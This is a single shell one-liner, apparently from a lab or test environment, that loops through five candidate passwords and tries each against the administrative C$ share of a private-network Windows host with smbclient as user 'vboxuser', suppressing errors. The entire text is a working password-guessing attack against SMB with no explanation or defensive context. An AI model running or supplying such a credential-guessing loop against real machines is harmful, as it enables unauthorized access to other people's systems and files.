for p in WrongPass1 Admin999 Lahore786 AttackerMode GuestPass123; do smbclient //192.168.18.212/C$ -U vboxuser%$p -c "exit" 2>/dev/null; done
